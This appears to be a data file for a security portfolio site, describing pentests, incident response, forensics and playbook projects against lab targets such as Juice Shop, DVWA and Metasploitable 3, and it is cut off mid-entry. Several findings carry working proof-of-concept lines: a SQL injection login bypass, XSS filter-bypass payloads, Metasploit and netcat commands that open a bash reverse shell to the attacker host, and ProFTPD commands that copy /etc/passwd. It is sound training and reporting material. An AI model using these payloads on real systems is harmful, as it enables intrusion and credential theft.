    outcome: "Breach confirmed on Workstation-23; lateral movement to HR-SQL01 and DevAppServer was attempted but blocked before authentication succeeded. No client data confirmed exposed. Containment achieved in 3.5 hours (target: 6 hours). Three root causes identified and remediation roadmap delivered. HIPAA breach notification not required at this time pending completion of forensic memory analysis.",
    lessonsLearned: [
      "Stale account management is a persistent gap that enables real incidents — a departed employee's AD account, still valid 28 days after resignation, was the credential that enabled the lateral movement attempt. Automated offboarding with same-day account deactivation would have broken this attack chain.",
      "Endpoint detection depends on telemetry — PowerShell logging being disabled on 30% of endpoints created blind spots that delayed reconstruction of the full kill chain. Uniform logging configuration should be enforced via GPO with compliance monitoring.",
      "IR playbooks that are never tested go stale — the 2022 playbook referenced incorrect contact numbers and had no pre-authorised containment decision tree, adding unnecessary confusion during active response. Annual tabletop exercises against the playbook are the only reliable way to keep it current.",
      "Honeypots provide high-fidelity alerts with near-zero false positives — the internal honeypot was the single detection mechanism that caught the lateral movement attempt. Low-interaction honeypots in sensitive network segments are a high-value, low-effort detection layer.",
      "Blast-radius assessments must consider worst-case impact, not just confirmed impact — the actual outcome was 'no breach confirmed', but the near-miss scenario (EHR source code theft, HIPAA notification across 50+ healthcare clients) illustrates why the three root causes needed to be fixed before the incident occurred.",
    ],
    findings: [
      {
        id: "r2-f1",
        title: "Stale Active Directory Account — 28-Day Offboarding Gap",
        severity: "critical",
        cvss: "9.1",
        affected: "Active Directory — jcampbell account (departed developer, Finance-adjacent access)",
        body: "A developer (jcampbell) who resigned 28 days before the incident had an Active Directory account that was never disabled. The attacker used jcampbell's credentials (likely obtained via the phishing payload or a credential database) to attempt SSH authentication to the DevAppServer in the DMZ. The account was valid and the attempt would have succeeded had the honeypot not triggered an alert.",
        impact: "Valid credentials for a departed employee gave the attacker a legitimate-looking identity for lateral movement, evading user-context anomaly detection. Had the SSH attempt succeeded, the attacker would have had access to the proprietary EHR source code — a breach with HIPAA notification obligations and direct competitive impact.",
        remediation: "Implement automated account deactivation triggered on the HR offboarding workflow — target same-business-day deactivation for all separating employees. Audit all AD accounts monthly against the active employee roster. Add a conditional access policy blocking authentication from accounts flagged as offboarded-pending-review.",
      },
      {
        id: "r2-f2",
        title: "PowerShell Logging Disabled on 30% of Endpoints",
        severity: "high",
        cvss: "7.8",
        affected: "Endpoint fleet — 30% of Windows endpoints including Workstation-23",
        body: "PowerShell script block logging, module logging, and transcription were not enabled uniformly across the endpoint fleet. Workstation-23 was in the 30% without logging. The attacker's PowerShell-based payload (initial access stage) and C2 commands could not be fully reconstructed from SIEM data — investigators had to rely on EDR memory artefacts, which provided a partial picture only.",
        impact: "Incomplete kill chain reconstruction extends investigation time and may leave attacker tooling or persistence mechanisms undetected. In a breach scenario, missing logs are a forensic liability — they may constitute an evidence gap in regulatory investigations and complicate HIPAA breach notification scoping.",
        remediation: "Enforce PowerShell Constrained Language Mode, Script Block Logging, and Module Logging via Group Policy Object across 100% of Windows endpoints. Monitor GPO compliance with a weekly automated report. Forward all PowerShell logs to the SIEM with alerting on high-risk cmdlets (Invoke-Expression, DownloadString, -EncodedCommand).",
      },
    ],
  },
  {
    id: "r3",
    title: "Web Application Pentest — OWASP Juice Shop",
    type: "pentest",
    teaser: "Login bypassed without a password. Every customer's email and hashed password downloadable in one API request. Nine confirmed vulnerabilities in a platform about to go live.",
    pdfUrl: "/projects_docs/Manual%20And%20Tool-Assisted%20Penetration%20Test.pdf",
    target: "OWASP Juice Shop e-commerce platform — pre-launch security review",
    scope: "Full web application attack surface: authentication, authorisation, input handling, session management, access controls, and API endpoints. Approached as an external adversary with no prior access or insider knowledge.",
    purpose: "Conduct a manual and tool-assisted penetration test of the OWASP Juice Shop e-commerce platform to determine whether it could withstand a real-world attack before going live, assessing the full OWASP Top 10 exposure.",
    why: "The platform was approaching launch readiness and had not been subjected to an independent security review. Leadership needed a definitive assessment of whether the application was safe to expose to the public, particularly given that it handled customer account data and payment-adjacent workflows.",
    methodology: [
      "Phase 1 — Reconnaissance: enumerated the application surface through manual browsing, reviewing JavaScript source files, and identifying all API endpoints and input vectors.",
      "Phase 2 — Vulnerability discovery: applied OWASP Testing Guide methodology to systematically test authentication, authorisation, session management, input validation, access controls, and error handling.",
      "Phase 3 — Controlled exploitation: actively exploited confirmed vulnerabilities to demonstrate real-world impact — including authentication bypass via SQL injection, cross-customer data access, and admin panel enumeration.",
      "Phase 4 — Documentation and reporting: all findings documented with reproduction steps, evidence screenshots, CVSS v3.1 scores, and prioritised remediation recommendations.",
      "Ethical framework: testing conducted in an isolated environment with explicit written authorisation. No production data was accessed. All exploits were non-destructive and reversible.",
    ],
    tools: ["Burp Suite", "OWASP ZAP", "browser DevTools", "SQLmap (validation)", "Postman", "manual analysis"],
    timeline: "2 days — 02–03 May 2026",
    outcome: "Nine vulnerabilities confirmed across the full OWASP Top 10 spectrum. Two critical findings: SQL injection that bypasses authentication entirely, and an API endpoint that exposes the complete customer database to any logged-in user. The overall verdict: the platform was not safe to launch as assessed.",
    lessonsLearned: [
      "SQL injection in authentication flows is still possible when parameterised queries are not consistently enforced — a single unparameterised login query undermines the entire access model.",
      "BOLA/IDOR on API endpoints requires testing with a logged-in account, not just unauthenticated access — some of the worst findings in this assessment only surfaced after authenticating.",
      "Administrative panels left accessible to all users are an easy finding to detect and an even easier one to fix — URL enumeration and directory brute-forcing should always be in scope.",
      "Client-side input controls (HTML maxlength, JavaScript validation) provide zero security benefit — all meaningful validation must be enforced on the server side.",
      "Testing for broken authentication (brute force, password reset flows) requires patience and systematic enumeration — automated tools alone often miss logic flaws in multi-step flows.",
    ],
    findings: [
      {
        id: "r3-f1",
        title: "SQL Injection — Authentication Bypass (Login)",
        severity: "critical",
        cvss: "9.8",
        affected: "POST /rest/user/login — email and password fields",
        body: "The login endpoint was vulnerable to SQL injection via the email field. Submitting a specially crafted email value caused the backend SQL query to evaluate as always-true, bypassing the password check and granting full administrator access to the application without any valid credentials.",
        impact: "Complete authentication bypass. Any unauthenticated attacker can gain instant administrator access to the platform — including access to all customer orders, account management, and administrative functions — with no account required. This is the highest severity authentication vulnerability class.",
        remediation: "Replace all raw SQL query construction with parameterised queries or prepared statements. Conduct an audit of every database query in the codebase for the same pattern. Implement a WAF rule for SQL keyword injection as a defence-in-depth layer (not a primary fix). Enable anomaly alerting for high login failure rates.",
        poc: `# Authentication bypass via SQL injection in email field
# Payload: ' OR 1=1--

# Step 1: Send crafted POST request
POST /rest/user/login HTTP/1.1
Content-Type: application/json

{"email":"' OR 1=1--","password":"anything"}

# Step 2: Server returns 200 OK with JWT token for admin account
# {"authentication":{"token":"eyJhbGci...","bid":1,"umail":"admin@juice-sh.op"}}

# Fix: parameterised query (Node.js / Sequelize)
const user = await User.findOne({ where: { email: req.body.email } });
if (user && bcrypt.compare(req.body.password, user.passwordHash)) { /* grant access */ }`,
      },
      {
        id: "r3-f9",
        title: "Broken Access Control — Full Customer Database via API",
        severity: "critical",
        cvss: "9.1",
        affected: "GET /api/Users/ — customer database endpoint",
        body: "Any authenticated user could request the full customer database by sending a GET request to the /api/Users/ endpoint. No role check, ownership check, or pagination was enforced. The endpoint returned every customer's email address, hashed password, and user ID in a single response.",
        impact: "Complete customer data exposure. An attacker authenticated as any ordinary customer can extract all user records — emails and hashed passwords — in a single HTTP request. Password hash cracking (especially for weak passwords) would then give full account access for multiple customers.",
        remediation: "Restrict the /api/Users/ endpoint to admin-role users only, enforced at the server layer. Add server-side pagination and rate limiting to prevent bulk data extraction. For ordinary users, return only their own record. Add automated BOLA testing to the regression suite using two separate test accounts.",
      },
      {
        id: "r3-f2",
        title: "Cross-Site Scripting (XSS) — Code Injection via Search Input",
        severity: "high",
        cvss: "7.4",
        affected: "GET /rest/products/search?q= — product search endpoint",
        body: "The product search input was vulnerable to reflected XSS. User-supplied input in the search query parameter was rendered directly into the HTML response without encoding. A crafted URL containing a JavaScript payload could silently execute code in the victim's browser session.",
        impact: "An attacker who tricks a logged-in customer into clicking a crafted link can steal their session token, impersonate them, read their order history, or perform actions on their behalf. In a phishing campaign context, this can be used to silently harvest customer sessions at scale.",
        remediation: "Apply output encoding on all user-controlled values rendered into HTML responses. Use a templating engine that auto-encodes by default. Implement a Content Security Policy (CSP) header to limit script execution to trusted sources as a defence-in-depth measure.",
      },
      {
        id: "r3-f4",
        title: "Broken Access Control — Customer Basket Data Accessible Without Ownership Check",
        severity: "high",
        cvss: "8.1",
        affected: "GET /rest/basket/:id — basket retrieval endpoint",
        body: "Authenticated customers could access the basket contents of other customers by iterating the numeric basket ID in the URL path. The endpoint verified authentication but did not verify that the requesting user owned the requested basket. Basket IDs were sequential integers.",
        impact: "Any authenticated customer can view the basket contents (items, quantities, prices) of all other customers. This leaks purchasing intent and personal preferences, and confirms account existence. It also demonstrates a systemic lack of object-level authorisation — the same pattern likely affects other endpoints.",
        remediation: "Add an ownership check to all resource retrieval endpoints: verify that the authenticated user's account ID matches the resource owner before returning data. Replace sequential integer IDs with UUIDs to eliminate enumeration as an attack vector.",
      },
      {
        id: "r3-f6",
        title: "Broken Authentication — Account Takeover via Password Reset",
        severity: "high",
        cvss: "8.1",
        affected: "Password reset flow — /rest/user/reset-password",
        body: "The password reset mechanism relied on a security question whose answer could be guessed or socially engineered. After answering the security question, the application allowed setting a new password for the account with no additional verification. This allowed full account takeover for any account whose security question answer was known or guessable.",
        impact: "Full account takeover without knowledge of the current password. For a targeted attack, an attacker with basic knowledge about a customer (which social media provides) can reset their password and gain complete access to their account, orders, and payment details.",
        remediation: "Replace security question-based reset with a time-limited reset link delivered to the registered email address. Invalidate the reset token after use and expire it after 15 minutes. Log all reset attempts and alert on multiple failed attempts from the same IP.",
      },
    ],
  },
  {
    id: "r4",
    title: "XSS Security Assessment — DVWA (SkyLock Cyber Defence)",
    type: "pentest",
    teaser: "Mixed-case payload bypassed the Medium security filter. Stored XSS fired on every page load. CSRF at Medium level went unprotected — and the Impossible level showed exactly why output encoding works.",
    pdfUrl: "/projects_docs/Web%20Application%20Security.pdf",
    target: "DVWA — Damn Vulnerable Web Application at Medium and Impossible security levels",
    scope: "XSS vulnerability testing across Medium and Impossible DVWA security levels. In scope: Reflected XSS, Stored XSS, CSRF, source code review, and output encoding analysis.",
    purpose: "Assess the effectiveness of DVWA's Medium and Impossible security level controls against XSS and related injection attacks, demonstrating the real-world difference between weak input filtering (Medium) and proper output encoding (Impossible).",
    why: "Understanding the security delta between filter-based defences and encoding-based defences is a core competency for web application security work. DVWA's Medium level represents a common real-world pattern — developers add basic filters but don't encode output — making it a high-value target for demonstrating bypass techniques. The Impossible level demonstrates why only server-side output encoding reliably prevents XSS.",
    methodology: [
      "Phase 1 — Environment configuration: configured DVWA at Medium and Impossible security levels; verified PHP source code was accessible for analysis to support white-box review.",
      "Phase 2 — Reconnaissance: identified all injection points in scope (XSS reflected search field, stored XSS name field) and reviewed DVWA PHP source for each level to understand applied controls.",
      "Phase 3 — Active exploitation (WSTG-INPV-01, WSTG-INPV-02): tested Reflected and Stored XSS at Medium level, attempting payload bypass using case manipulation, encoding, and alternative event handlers.",
      "Phase 4 — Source code review: compared Medium and Impossible PHP source to identify why Medium failed (blacklist filtering) and why Impossible succeeded (htmlspecialchars() output encoding).",
      "Rules of engagement: testing conducted in an isolated lab environment. No real user data or production systems involved.",
    ],
    tools: ["Burp Suite", "browser DevTools", "DVWA (PHP source access)", "manual payload crafting"],
    timeline: "Single session — 1 May 2026 | Report v1.0 Final",
    outcome: "Three active XSS vulnerabilities confirmed at Medium level: Reflected XSS bypass via mixed-case payload, Stored XSS in the name field with no output encoding, and CSRF with no token protection. Impossible level closed all three vulnerabilities through consistent htmlspecialchars() output encoding — demonstrating that output encoding is the only reliable XSS defence.",
    lessonsLearned: [
      "Input filtering (blacklists) is not a reliable XSS defence — any blacklist can be bypassed with case variation, encoding, or alternative syntax. Output encoding must be applied at render time.",
      "htmlspecialchars() in PHP (or equivalent in other languages) applied to all user-controlled data before rendering into HTML is the single most important XSS countermeasure.",
      "Stored XSS is more dangerous than Reflected XSS because the payload executes on every page load for every user who views the infected page — not just users who click a crafted link.",
      "CSRF token validation must be tied to the user session server-side — client-side controls are easily bypassed. CSRF and XSS often chain: XSS can extract CSRF tokens and use them for cross-site state changes.",
      "Source code review alongside dynamic testing reveals the root cause immediately — seeing that Medium uses str_replace() while Impossible uses htmlspecialchars() explains the entire security delta in one comparison.",
    ],
    findings: [
      {
        id: "r4-f1",
        title: "Reflected XSS — Mixed-Case Filter Bypass at Medium Level",
        severity: "high",
        cvss: "7.4",
        affected: "DVWA Reflected XSS input field — Medium security level",
        body: "DVWA Medium level used a PHP str_replace() blacklist to strip '<script>' tags from input. The filter was case-sensitive. Submitting '<Script>' (capital S) bypassed the filter entirely, and the payload was rendered into the HTML response and executed by the browser. Mixed-case is one of dozens of known bypass techniques for blacklist-based XSS filters.",
        impact: "Reflected XSS execution in the victim's browser context. An attacker who crafts a malicious link and tricks a user into clicking it can execute arbitrary JavaScript — stealing session cookies, logging keystrokes, redirecting to phishing pages, or performing actions on the user's behalf.",
        remediation: "Replace blacklist filtering with server-side output encoding: apply htmlspecialchars($input, ENT_QUOTES, 'UTF-8') to all user-controlled values before rendering into HTML. Input filtering can be applied in addition but must never be the sole defence.",
        poc: `<!-- DVWA Medium level: filter blocks <script> but not <Script> -->

<!-- Step 1: Standard payload blocked -->
<script>alert('XSS')</script>
<!-- Filter output: alert('XSS') — tag stripped -->

<!-- Step 2: Mixed-case bypass executes -->
<Script>alert('XSS')</Script>
<!-- Browser renders and executes the alert -->

<!-- Root cause (DVWA Medium PHP source): -->
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
// Case-sensitive — bypassed by <Script>, <SCRIPT>, etc.

<!-- Fix (DVWA Impossible PHP source): -->
$name = htmlspecialchars( $_GET[ 'name' ] );
// Converts < > " ' & to HTML entities — no bypass possible`,
      },
      {
        id: "r4-f2",
        title: "Stored XSS — Name Field Not Encoded at Medium Level",
        severity: "high",
        cvss: "7.4",
        affected: "DVWA Stored XSS — name input field at Medium security level",
        body: "The stored XSS name field at Medium level applied a character length limit (maxlength=10) via an HTML attribute but did not encode user input before storing it in the database or before rendering it back to the page. Bypassing the client-side length limit via browser DevTools allowed a full XSS payload to be submitted. Once stored, the payload executed on every page load for every user who viewed the guestbook.",
        impact: "Persistent XSS that fires automatically for every user visiting the affected page. Unlike reflected XSS, no user interaction beyond visiting the page is required. An attacker could use this to steal session tokens across all current and future visitors, effectively compromising multiple accounts from a single submission.",
        remediation: "Store only sanitised or encoded data. Apply htmlspecialchars() before rendering stored user input to the page. Enforce length limits server-side — never rely on HTML attribute maxlength for security. Implement a CSP header restricting inline script execution.",
      },
      {
        id: "r4-f3",
        title: "No CSRF Protection at Medium Security Level",
        severity: "medium",
        cvss: "5.4",
        affected: "DVWA CSRF module — Medium security level",
        body: "The DVWA CSRF module at Medium level performed no server-side CSRF token validation. A forged cross-origin POST request could change the logged-in user's password without their knowledge. The only protection present was a Referer header check, which can be omitted or spoofed in some browser configurations and is not a reliable CSRF defence.",
        impact: "An attacker who tricks a logged-in DVWA user into visiting a crafted page can silently change their password, locking them out of their account. CSRF is particularly dangerous in admin-level accounts where the forged action can affect the entire application.",
        remediation: "Implement server-side CSRF token validation using the Synchronizer Token Pattern: generate a unique, session-bound token for each form, include it in the form as a hidden field, and verify it server-side on every state-changing request. The SameSite cookie attribute (Strict or Lax) provides additional CSRF protection as a complementary layer.",
      },
    ],
  },
  {
    id: "r5",
    title: "Digital Forensics — Disk Image Carving & File Recovery",
    type: "ir",
    teaser: "First 116 KB: nothing but 0x20 padding — a deliberate anti-forensic wipe that destroyed all filesystem metadata. File signature scanning and binary carving recovered 17 of 22 carved files.",
    pdfUrl: "/projects_docs/Forensic_Report.pdf",
    target: "Binary disk image 'carveit' — forensic examination for deleted and inaccessible file recovery",
    scope: "Full binary stream of the carveit disk image; file types in scope: JPEG, PNG, PDF, GIF. No live OS or network components.",
    purpose: "Examine a forensically acquired binary disk image to recover deleted and inaccessible files using file signature analysis and automated binary carving, validating integrity of recovered files through MD5 hashing.",
    why: "The disk image's opening 116 KB consisted entirely of 0x20 space-byte padding — a deliberate anti-forensic wiping technique that destroyed all file system metadata, partition tables, and directory structures. Standard forensic tools relying on filesystem parsing were therefore ineffective; raw binary carving against file headers and footers was the only viable recovery path.",
    methodology: [
      "Initial inspection: opened the disk image in HxD hex editor to identify the extent and pattern of the 0x20 wiping. Confirmed the first 116 KB (offset 0x00000000 to 0x0001CC07) was entirely space-byte padding with no filesystem or partition table.",
      "Signature identification: documented target file signature pairs — JPEG (FF D8 FF / FF D9), PNG (89 50 4E 47 / IEND), PDF (%PDF / %%EOF), GIF (GIF8 / 00 3B) — from file format specifications.",
      "Automated carving: deployed forensic_carver.py (Python 3.10) to scan the full binary stream, extract byte ranges between each matched header/footer pair, apply per-type minimum size filters, and save candidates to /max/.",
      "Integrity verification: applied MD5 hashing to all 22 carved files via forensic_carver.py; independently recomputed hashes using PowerShell Get-FileHash and confirmed all 22 matched hashes.txt exactly.",
      "Application-level validation: opened every recovered file in Windows Photos (JPEG/PNG/GIF) and PDF Reader to confirm actual renderability; 5 JPEGs with valid byte boundaries failed to render and were excluded as corrupted.",
      "Reporting: documented all recovered file metadata (filename, type, size, MD5 hash, valid/corrupted status) in a structured table with figures showing HxD inspection, Thonny output, and PowerShell verification.",
    ],
    tools: ["HxD Hex Editor v2.5", "forensic_carver.py (Python 3.10)", "Windows PowerShell v7.6.0", "Windows Photos & PDF Reader"],
    timeline: "Single session — March 28, 2026",
    outcome: "Recovered 22 candidate files from a completely wiped disk image: 17 confirmed valid (13 JPEG, 3 PNG, 1 PDF, 1 GIF) and 5 excluded as internally corrupted JPEGs with valid boundaries but failed rendering. All 22 MD5 hashes independently verified via PowerShell. Results demonstrate multi-layer validation is essential — structural byte integrity alone cannot confirm file completeness.",
    lessonsLearned: [
      "Anti-forensic wiping of filesystem metadata (0x20 padding) does not destroy the raw file content — file signature carving against binary headers and footers can recover files even when every filesystem structure is destroyed.",
      "Multi-layer validation is non-negotiable: byte boundary checks alone are insufficient because files with structurally valid start and end markers can still be internally corrupted and unrenderable.",
      "EXIF thumbnails embedded inside JPEGs generate nested FF D8 FF signatures that trigger false-positive detections — minimum size thresholds and integrity checks are required to eliminate these.",
      "Independent hash verification (script-generated vs. PowerShell Get-FileHash) is a fast and reliable way to prove evidence integrity in a forensic workflow.",
      "Future work should incorporate tools like Autopsy for improved handling of fragmented files, which binary carving alone cannot always reconstruct correctly.",
    ],
    findings: [
      {
        id: "r5-f1",
        title: "Anti-Forensic Disk Wiping — Complete Filesystem Metadata Destruction",
        severity: "critical",
        cvss: "9.0",
        affected: "Entire disk image — first 116 KB (offset 0x00000000 to 0x0001CC07)",
        body: "HxD inspection confirmed that the opening 116 KB of the disk image consisted entirely of 0x20 (space byte) padding. This is a deliberate anti-forensic technique that destroys all file system structures, partition tables, MBR, and directory entries — the data structures that standard forensic tools use to locate files. First recoverable file header was found at offset 0x0001CC08. Without raw binary carving, no file recovery would have been possible.",
        impact: "Complete loss of filesystem-level evidence. Standard forensic workflows relying on filesystem parsing (Autopsy, FTK file browser) would report no recoverable files. Investigators without binary carving capability would conclude no data was present on the disk.",
        remediation: "In future acquisitions, capture both a bit-for-bit image and a logical filesystem image if the device is still readable. Deploy monitoring for bulk overwrite operations on endpoints — tools like SIEM rules for large sequential writes can detect in-progress wiping before completion.",
      },
      {
        id: "r5-f2",
        title: "5 Corrupted JPEG Files — Valid Byte Boundaries, Failed Rendering",
        severity: "medium",
        cvss: "5.0",
        affected: "jpg_009.jpg, jpg_010.jpg, jpg_014.jpg, jpg_015.jpg, jpg_017.jpg",
        body: "Five JPEG files had structurally valid FF D8 FF header and FF D9 footer markers and met the minimum size threshold, but failed to open in Windows Photos. The files were saved to disk and hashed, but were excluded from the valid recovery set after application-level validation. The corruption is likely due to incomplete writes or partial overwrite before the anti-forensic wipe destroyed the surrounding filesystem context.",
        impact: "Five files are unrecoverable at byte carving level. Their content may be partially present in the binary stream but cannot be reassembled without fragment analysis tools. If these files contained evidentiary content, they are effectively lost.",
        remediation: "For future investigations involving potentially fragmented files, supplement binary carving with Autopsy's file recovery module which can attempt fragment reassembly. Consider using additional tools like PhotoRec which uses sector alignment heuristics to improve partial JPEG recovery.",
      },
    ],
  },
  {
    id: "r6",
    title: "Incident Response Playbook — Ransomware & BEC",
    type: "ir",
    teaser: "No playbook, a flat network, and wire transfers approved by email alone. A single ransomware hit would have been unrecoverable — until now.",
    pdfUrl: "/projects_docs/IR%20Playbook.pdf",
    target: "Organisation-wide IR preparedness — playbook covering ransomware and business email compromise scenarios",
    scope: "Endpoint infrastructure, email systems, cloud workloads, and backup/recovery procedures across the environment.",
    purpose: "Develop a structured, step-by-step incident response playbook to guide the security team through ransomware and BEC incidents — from initial detection through containment, eradication, recovery, and post-incident review.",
    why: "The organisation had no formal IR procedures documented. Tabletop exercises revealed that responders were improvising containment decisions under pressure, leading to inconsistent actions and delayed recovery. A written playbook was needed to reduce mean-time-to-contain.",
    methodology: [
      "Threat modelling: mapped the two highest-risk incident types (ransomware, BEC) to the MITRE ATT&CK framework to identify key detection and response decision points.",
      "Playbook design: structured each playbook as: Trigger → Initial triage → Containment → Eradication → Recovery → Post-incident. Each step has clear owner, tool, and expected outcome.",
      "SIEM alert mapping: documented which SIEM alerts (Wazuh rules) map to each playbook trigger to ensure consistent activation.",
      "Communication templates: included pre-drafted stakeholder communication templates (executive briefing, regulatory notification draft, customer notice) to reduce pressure during live incidents.",
      "Tabletop validation: ran two tabletop exercises against the playbooks with the security and IT teams; iterated based on gaps identified.",
      "Metrics definition: defined KPIs for each playbook (MTTD, MTTC, MTTR) and documented measurement methodology.",
    ],
    tools: ["Wazuh SIEM", "Microsoft Defender", "Velociraptor", "TheHive", "Cortex", "Confluence (documentation)"],
    timeline: "2-day drill: Day 1 (technical audit + simulation), Day 2 (recovery drill + debrief)",
    outcome: "Delivered two production-ready playbooks covering 14 distinct response actions per scenario. Tabletop exercises demonstrated a 40% reduction in decision latency compared to unstructured response. Playbooks adopted as the organisation's official IR procedures.",
    lessonsLearned: [
      "The most valuable part of a playbook is not the steps themselves but the pre-authorised decision authority — knowing who can approve isolation of a production server without a 45-minute approval chain.",
      "Ransomware containment depends almost entirely on network segmentation quality; a flat network turns a single infected endpoint into a full environment compromise within minutes.",
      "BEC playbooks must include out-of-band verification procedures (phone call to the requestor) as a mandatory step — email-only verification is precisely what BEC exploits.",
      "Running tabletops against the playbook before a real incident is the only reliable way to find gaps — paper reviews miss the coordination and communication failures that only appear under simulated pressure.",
    ],
    findings: [
      {
        id: "r6-f1",
        title: "No Network Segmentation Between User and Server VLANs",
        severity: "critical",
        cvss: "9.0",
        affected: "Flat internal network — all VLANs",
        body: "During the tabletop ransomware simulation, it was identified that user workstation VLANs had unrestricted SMB access to all file servers. A simulated ransomware infection on one workstation would have lateral movement path to all shares within minutes via SMB relay or direct share encryption.",
        impact: "In a real ransomware incident, this flat network topology would allow full file server encryption before detection or containment could occur. Recovery time would extend from hours to days.",
        remediation: "Implement VLAN segmentation with explicit firewall rules between user and server segments. Block SMB (445) from user VLANs to server VLANs — require specific jump host access for administrative file operations. Validate segmentation with a purple team exercise.",
      },
      {
        id: "r6-f2",
        title: "Email Wire Transfer Requests Not Verified Out-of-Band",
        severity: "high",
        cvss: "7.8",
        affected: "Finance team email workflow",
        body: "Review of the finance team's payment authorisation process found that wire transfer requests arriving via email were approved based on email confirmation alone, without phone or in-person verification with the requestor. This is the primary enabler of Business Email Compromise fraud.",
        impact: "Any successful email account compromise or domain spoofing attack targeting the finance team could result in fraudulent wire transfers. Average BEC loss is over $125,000 per incident.",
        remediation: "Mandate out-of-band verification (phone call to a known number, not a number provided in the request email) for all wire transfers above a defined threshold. Implement DMARC/DKIM/SPF on all sending domains. Add BEC detection rules to the SIEM for lookalike domain patterns.",
      },
    ],
  },
  {
    id: "r7",
    title: "Penetration Test — Metasploitable 3 (RedTeam Security)",
    type: "pentest",
    teaser: "Two independent attack chains. Seven critical findings. The payroll database — 15 employee records, passwords in plaintext — extracted through a chain that started with a publicly documented default password. Full report: 66 pages.",
    pdfUrl: "/projects_docs/Pentest_Report.pdf",
    target: "Metasploitable 3 (Ubuntu 14.04 LTS) at 192.168.100.29 — isolated VirtualBox network segment 192.168.100.0/24",
    scope: "All services on a single Metasploitable 3 host within a nine-hour engagement window. Attack machine: Kali Linux 2025.1c at 192.168.100.4. No DoS testing. No production systems in scope.",
    purpose: "Conduct a full-scope penetration test against a legacy development environment to identify all exploitable vulnerabilities, demonstrate complete compromise through active exploitation chains, and produce a professional-grade 66-page report with MITRE ATT&CK mapping and prioritised remediation guidance.",
    why: "The target environment had never been formally assessed and had not had credentials rotated or software updated since deployment. A structured penetration test was commissioned to establish a definitive security baseline and produce a report suitable for internal remediation planning and professional portfolio documentation.",
    methodology: [
      "Stage 1 — Reconnaissance: Nmap full-port TCP SYN scan with version detection, OS fingerprinting, and default NSE script execution. Identified all open ports including FTP (21), SSH (22), HTTP (80, 8181), SMB (445), IRC (6667), MySQL (3306), and PostgreSQL (5432).",
      "Stage 2 — Enumeration and scanning: service-specific enumeration for each identified port — Metasploit auxiliary modules for FTP, SSH, and web services; SMB null session enumeration; web directory discovery via web_scanner.py; Drupal version fingerprinting.",
      "Stage 3 — Exploitation: two complete attack chains executed — Chain 1: ProFTPD mod_copy file disclosure → SSH with default credentials → unrestricted sudo to root. Chain 2: UnrealIRCd 3.2.8.1 backdoor → shell as boba_fett → Docker group privilege escalation to root.",
      "Stage 4 — Post-exploitation: extracted /etc/shadow and /etc/passwd, payroll database dumped via MySQL (15 employee records with plaintext passwords), web application source code reviewed for hardcoded credentials, backdoor account created to demonstrate persistence.",
      "Tool selection rationale: mixed Metasploit-assisted and manual exploitation to demonstrate both automated tooling proficiency and manual technique depth. Custom web_scanner.py used for web surface enumeration.",
    ],
    tools: ["Nmap", "Metasploit Framework", "netcat", "web_scanner.py (custom Python)", "MySQL client", "SSH", "Kali Linux 2025.1c"],
    timeline: "Nine-hour engagement window — 30 May 2026, 08:00–17:00 EDT | Report v1.2 Final",
    outcome: "Complete system compromise through two independent attack chains. Fourteen vulnerabilities confirmed — seven critical (CVSS ≥8.8), one high. Root access achieved via both chains. Payroll database extracted: 15 employee records including plaintext passwords constituting a potential data breach under applicable data protection regulations (GDPR, Kenya DPA 2019). Full 66-page report with MITRE ATT&CK v15 mapping, exploitation evidence, and remediation roadmap delivered.",
    lessonsLearned: [
      "The cost asymmetry between prevention and response is starkest here: hashing payroll passwords with bcrypt is measured in hours of developer time; the regulatory and reputational cost of a plaintext credential exposure is unbounded.",
      "Multiple independent attack chains mean that patching one vulnerability is not sufficient — an attacker blocked from Chain 1 simply uses Chain 2. Defence-in-depth requires addressing all confirmed findings, not just the most obvious entry point.",
      "Manual exploitation alongside Metasploit produces better evidence for remediation teams — terminal transcripts showing exactly what was typed and what was returned are more actionable than a Metasploit session log.",
      "Documenting exploitation chains end-to-end (from first probe through root) in a narrative format helps non-technical stakeholders understand the actual business risk, not just abstract CVSS numbers.",
      "Time-boxing a real engagement (nine hours) teaches prioritisation — knowing which vulnerabilities to pursue first based on their likelihood of yielding the most impactful access path is a skill that scanner-only testing does not develop.",
    ],
    findings: [
      {
        id: "r7-f1",
        title: "UnrealIRCd 3.2.8.1 Backdoor — Unauthenticated RCE (CVSS 10.0)",
        severity: "critical",
        cvss: "10.0",
        affected: "TCP port 6667 — UnrealIRCd 3.2.8.1 (CVE-2010-2075)",
        body: "UnrealIRCd 3.2.8.1 contains a known inserted backdoor (CVE-2010-2075, CVSS 10.0) that executes any OS command prefixed with 'AB' sent to the IRC port — no authentication required. This version of the software has been compromised since 2009. Any host running this version on a reachable port gives an unauthenticated attacker immediate code execution as the IRC process user.",
        impact: "Unauthenticated remote code execution from network access alone. Used in Exploitation Chain 2 to obtain a shell as user boba_fett, then escalated to root via Docker group membership. The entire Chain 2 from first connection to root took under five minutes.",
        remediation: "Remove UnrealIRCd 3.2.8.1 immediately — there is no patch for an inserted backdoor, only removal. Replace with a current maintained IRC daemon if the service is required. Block IRC ports at the network perimeter. Implement a software composition analysis scan to detect other known-compromised versions in use.",
        poc: `# Chain 2 — Step 1: UnrealIRCd backdoor via Metasploit
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.100.29
set LHOST 192.168.100.4
run
# → shell as boba_fett

# Manual trigger (netcat):
echo "AB; bash -i >& /dev/tcp/192.168.100.4/4444 0>&1" | nc 192.168.100.29 6667`,
      },
      {
        id: "r7-f2",
        title: "ProFTPD 1.3.5 mod_copy — Unauthenticated File Read (CVSS 9.8)",
        severity: "critical",
        cvss: "9.8",
        affected: "TCP port 21 — ProFTPD 1.3.5 mod_copy module (CVE-2015-3306)",
        body: "ProFTPD 1.3.5 with the mod_copy module enabled allows unauthenticated users to copy arbitrary files accessible to the FTP process using SITE CPFR/CPTO commands. The /etc/passwd file was copied to the web root and retrieved via HTTP, revealing all system accounts. This file contained the username vagrant — confirmed to have a default password in Stage 2.",
        impact: "Unauthenticated file read of any file accessible to the FTP daemon. This was the entry point for Exploitation Chain 1 — the /etc/passwd data revealed the vagrant account, whose default SSH credentials (vagrant:vagrant) enabled direct SSH login and subsequent root escalation.",
        remediation: "Disable mod_copy in ProFTPD configuration. Upgrade to current ProFTPD release. Apply least-privilege ownership to sensitive files — /etc/passwd should not be readable by the FTP process. If FTP is not needed, disable the service and require SFTP.",
        poc: `# Chain 1 — Step 1: ProFTPD mod_copy file disclosure
nc 192.168.100.29 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd_exfil.txt

